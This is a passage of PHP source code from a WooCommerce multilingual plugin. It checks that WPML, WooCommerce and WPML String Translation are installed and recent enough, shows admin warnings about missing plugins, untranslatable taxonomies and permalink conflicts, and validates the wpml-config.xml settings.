                $missing['WPML'] = $this->tracking_link->getWpmlHome();
                $core_ok = false;
            } elseif (
                version_compare(ICL_SITEPRESS_VERSION, self::MIN_WPML, '<')
            ) {
                add_action('admin_notices', [$this, '_old_wpml_warning']);
                $core_ok = false;
            } elseif (!$sitepress->setup()) {
                if (!(isset($_GET['page']) && WPML_PLUGIN_FOLDER . '/menu/languages.php' === $_GET['page'])) {
                    add_action('admin_notices', [$this, '_wpml_not_installed_warning']);
                }
                $core_ok = false;
            }

            if (!class_exists('WooCommerce') || !function_exists('WC')) {
                $missing['WooCommerce'] = 'http://www.woothemes.com/woocommerce/';
                $wc_ok = false;
            } elseif (
                defined('WC_VERSION') && version_compare(WC_VERSION, self::MIN_WOOCOMMERCE, '<') ||
                isset($woocommerce->version) && version_compare($woocommerce->version, self::MIN_WOOCOMMERCE, '<')
            ) {
                add_action('admin_notices', [$this, '_old_wc_warning']);
                $wc_ok = false;
            }

            if (!defined('WPML_ST_VERSION')) {
                $missing['WPML String Translation'] = $this->tracking_link->getWpmlStFaq();
                $st_ok = false;
            } elseif (version_compare(WPML_ST_VERSION, self::MIN_WPML_ST, '<')) {
                add_action('admin_notices', [$this, '_old_wpml_st_warning']);
                $st_ok = false;
            }

            $has_no_wpml_plugin = !($core_ok || $st_ok);
            $full_mode = $core_ok && $st_ok && $wc_ok;
            $standalone = $has_no_wpml_plugin && $wc_ok;
            $this->allok = $full_mode || $standalone;

            if (!$this->allok && count($missing)) {
                $possibly_standalone = $has_no_wpml_plugin && !$wc_ok;
                add_action('admin_notices', self::show_missing_plugins_warning($missing, $possibly_standalone));
            }

            if ($full_mode) {
                $this->check_for_incompatible_permalinks();
                add_action('init', [$this, 'check_for_translatable_default_taxonomies']);
            }

            if ($sitepress instanceof SitePress) {
                $this->allok = $full_mode && $sitepress->setup();
            }
        }

        return $this->allok;
    }

    public function _old_wpml_warning()
    {
        printf(
            __(
                'WPML Multilingual & Multicurrency for WooCommerce is enabled but not effective. It is not compatible with  <a href="%1$s">WPML</a> versions prior %2$s.',
                'woocommerce-multilingual'
            ),
            $this->tracking_link->getWpmlHome(),
            self::MIN_WPML
        );
    }

    public function _wpml_not_installed_warning()
    {
        printf(__('WPML Multilingual & Multicurrency for WooCommerce is enabled but not effective. Please finish the installation of WPML first.', 'woocommerce-multilingual'));
    }

    public function _old_wc_warning()
    {
        printf(
            __(
                'WPML Multilingual & Multicurrency for WooCommerce is enabled but not effective. It is not compatible with  <a href="%1$s">Woocommerce</a> versions prior %2$s.',
                'woocommerce-multilingual'
            ),
            'http://www.woothemes.com/woocommerce/',
            self::MIN_WOOCOMMERCE
        );
    }

    public function _old_wpml_st_warning()
    {
        printf(
            __(
                'WPML Multilingual & Multicurrency for WooCommerce is enabled but not effective. It is not compatible with  <a href="%1$s">WPML String Translation</a> versions prior %2$s.',
                'woocommerce-multilingual'
            ),
            $this->tracking_link->getWpmlHome(),
            self::MIN_WPML_ST
        );
    }

    public function check_for_translatable_default_taxonomies()
    {
        $default_taxonomies = ['product_cat', 'product_tag', 'product_shipping_class'];
        $show_error = false;

        foreach ($default_taxonomies as $taxonomy) {
            if (!is_taxonomy_translated($taxonomy)) {
                $show_error = true;
                break;
            }
        }

        if ($show_error) {
            $support_link = '<a href="' . WCML_Tracking_Link::getWpmlSupport() . '">' . __('WPML support', 'woocommerce-multilingual') . '</a>';

            $sentences[] = _x("Some taxonomies in your site are forced to be untranslatable. This is causing a problem when you're trying to run a multilingual WooCommerce site.", 'Default taxonomies must be translatable: 1/6', 'woocommerce-multilingual');

            $sentences[] = _x('A plugin or the theme are probably doing this.', 'Default taxonomies must be translatable: 2/6', 'woocommerce-multilingual');

            $sentences[] = _x('What you can do:', 'Default taxonomies must be translatable: 3/6', 'woocommerce-multilingual');

            $sentences[] = _x('1. Temporarily disable plugins and see if this message disappears.', 'Default taxonomies must be translatable: 4/6', 'woocommerce-multilingual');

            $sentences[] = _x('2. Temporarily switch the theme and see if this message disappears.', 'Default taxonomies must be translatable: 5/6', 'woocommerce-multilingual');

            $sentences[] = sprintf(_x("It's best to contact %s, tell that you're getting this message and offer to send a Duplicator copy of the site. We will work with the theme/plugin author and fix the problem for good. In the meanwhile, we'll give you a temporary solution, so you're not stuck.", 'Default taxonomies must be translatable: 6/6', 'woocommerce-multilingual'), $support_link);

            $this->err_message = '<div class="message error"><p>' . implode('</p><p>', $sentences) . '</p></div>';
            add_action('admin_notices', [$this, 'plugin_notice_message']);
        }
    }

    private static function show_missing_plugins_warning($missing_plugins, $possibly_standalone)
    {
        return function () use ($missing_plugins, $possibly_standalone) {
            if ($possibly_standalone) {
                $missing_plugins = array_intersect_key($missing_plugins, ['WooCommerce' => 1]);
            }

            $missing = '';
            $counter = 0;
            foreach ($missing_plugins as $title => $url) {
                $counter++;
                if ($counter == sizeof($missing_plugins)) {
                    $sep = '';
                } elseif ($counter == sizeof($missing_plugins) - 1) {
                    $sep = ' ' . __('and', 'woocommerce-multilingual') . ' ';
                } else {
                    $sep = ', ';
                }
                $missing .= '<a href="' . $url . '">' . $title . '</a>' . $sep;
            }

            printf(__('WPML Multilingual & Multicurrency for WooCommerce is enabled but not effective. It requires %s in order to work.', 'woocommerce-multilingual'), $missing);
        };
    }

    private function check_for_incompatible_permalinks()
    {
        global $sitepress_settings, $pagenow;

        $permalinks = get_option('woocommerce_permalinks', ['product_base' => '']);
        if (empty($permalinks['product_base'])) {
            return;
        }

        $tm_folder = defined('WPML_TM_FOLDER') ? WPML_TM_FOLDER : 'tm';

        $message = __('Because this site uses the default permalink structure, you cannot use slug translation for product permalinks.', 'woocommerce-multilingual');
        $message .= '<br /><br />';
        $message .= __('Please choose a different permalink structure or disable slug translation.', 'woocommerce-multilingual');
        $message .= '<br /><br />';
        $message .= '<a href="' . admin_url('options-permalink.php') . '">' . __('Permalink settings', 'woocommerce-multilingual') . '</a>';
        $message .= ' | ';
        $message .= '<a href="' . admin_url('admin.php?page=' . $tm_folder . '/menu/main.php&sm=mcsetup#icl_custom_posts_sync_options') . '">' . __('Configure products slug translation', 'woocommerce-multilingual') . '</a>';

        $compatible = true;
        $permalink_structure = get_option('permalink_structure');
        if (empty($permalink_structure) &&
                !empty($sitepress_settings['posts_slug_translation']['on']) &&
                !empty($sitepress_settings['posts_slug_translation']['types']) &&
                $sitepress_settings['posts_slug_translation']['types']['product']) {
            $compatible = false;
        }

        if (!$compatible && ($pagenow == 'options-permalink.php' || (isset($_GET['page']) && \WCML\Utilities\AdminUrl::PAGE_WPML_WCML == $_GET['page']))) {
            $this->err_message = '<div class="message error"><p>' . $message . '    </p></div>';
            add_action('admin_notices', [$this, 'plugin_notice_message']);
        }
    }

    public function plugin_notice_message()
    {
        echo $this->err_message;
    }

    public function check_wpml_config()
    {
        global $sitepress_settings, $sitepress, $woocommerce_wpml;

        if (empty($sitepress_settings) || !$this->check()) {
            return;
        }

        $file = realpath(WCML_PLUGIN_PATH . '/wpml-config.xml');
        if (!file_exists($file)) {
            $this->xml_config_errors[] = __('wpml-config.xml file missing from WPML Multilingual & Multicurrency for WooCommerce folder.', 'woocommerce-multilingual');
        } else {
            $config = icl_xml2array(file_get_contents($file));

            if (isset($config['wpml-config'])) {
                $cfs = [];

                if (isset($config['wpml-config']['custom-fields'])) {
                    if (isset($config['wpml-config']['custom-fields']['custom-field']['value'])) {
                        $cfs[] = $config['wpml-config']['custom-fields']['custom-field'];
                    } else {
                        foreach ($config['wpml-config']['custom-fields']['custom-field'] as $cf) {
                            $cfs[] = $cf;
                        }
                    }

                    if ($cfs) {
                        foreach ($cfs as $cf) {
                            if (!isset($sitepress_settings['translation-management']['custom_fields_translation'][$cf['value']])) {
                                continue;
                            }

                            $effective_config_value = $sitepress_settings['translation-management']['custom_fields_translation'][$cf['value']];
                            $correct_config_value = $cf['attr']['action'] == 'copy' ? 1 : ($cf['attr']['action'] == 'translate' ? 2 : 0);

                            if ($effective_config_value != $correct_config_value) {
                                $this->xml_config_errors[] = sprintf(__('Custom field %s configuration from wpml-config.xml file was altered!', 'woocommerce-multilingual'), '<i>' . $cf['value'] . '</i>');
                            }
                        }
                    }
                }

                if (isset($config['wpml-config']['custom-types'])) {
                    $cts = [];

                    if (isset($config['wpml-config']['custom-types']['custom-type']['value'])) {
                        $cts[] = $config['wpml-config']['custom-types']['custom-type'];
                    } else {
                        foreach ($config['wpml-config']['custom-types']['custom-type'] as $cf) {
                            $cts[] = $cf;
                        }
                    }

                    if ($cts) {
                        foreach ($cts as $ct) {
                            if (!isset($sitepress_settings['custom_posts_sync_option'][$ct['value']])) {
                                continue;
                            }
                            $effective_config_value = $sitepress_settings['custom_posts_sync_option'][$ct['value']];
                            $correct_config_value = $ct['attr']['translate'];

                            if ('product' === $ct['value'] && $woocommerce_wpml->products->is_product_display_as_translated_post_type()) {
                                $correct_config_value = WPML_CONTENT_TYPE_DISPLAY_AS_IF_TRANSLATED;
                            }

                            if ($effective_config_value != $correct_config_value) {
                                $this->xml_config_errors[] = sprintf(__('Custom type %s configuration from wpml-config.xml file was altered!', 'woocommerce-multilingual'), '<i>' . $ct['value'] . '</i>');
                            }
                        }
                    }
                }

                if (isset($config['wpml-config']['taxonomies'])) {
                    $txs = [];

                    if (isset($config['wpml-config']['taxonomies']['taxonomy']['value'])) {
                        $txs[] = $config['wpml-config']['taxonomies']['taxonomy'];
                    } else {
                        foreach ($config['wpml-config']['taxonomies']['taxonomy'] as $cf) {
                            $txs[] = $cf;
                        }
                    }

                    if ($txs) {
                        foreach ($txs as $tx) {
                            if (!isset($sitepress_settings['taxonomies_sync_option'][$tx['value']])) {
                                continue;
                            }
                            $effective_config_value = $sitepress_settings['taxonomies_sync_option'][$tx['value']];
                            $correct_config_value = $tx['attr']['translate'];

                            if (method_exists($sitepress, 'is_display_as_translated_taxonomy') && $sitepress->is_display_as_translated_taxonomy($tx['value'])) {
                                $correct_config_value = WPML_CONTENT_TYPE_DISPLAY_AS_IF_TRANSLATED;
                            }

                            if ($effective_config_value != $correct_config_value) {
                                $this->xml_config_errors[] = sprintf(__('Custom taxonomy %s configuration from wpml-config.xml file was altered!', 'woocommerce-multilingual'), '<i>' . $tx['value'] . '</i>');
                            }
                        }
                    }
                }
            }
        }
    }

    public function required_plugin_install_link($repository = 'wpml')
    {
        if (class_exists('WP_Installer_API')) {
            $url = WP_Installer_API::get_product_installer_link($repository);
        } else {
            $url = $this->tracking_link->getWpmlHome();
        }

        return $url;
    }
}
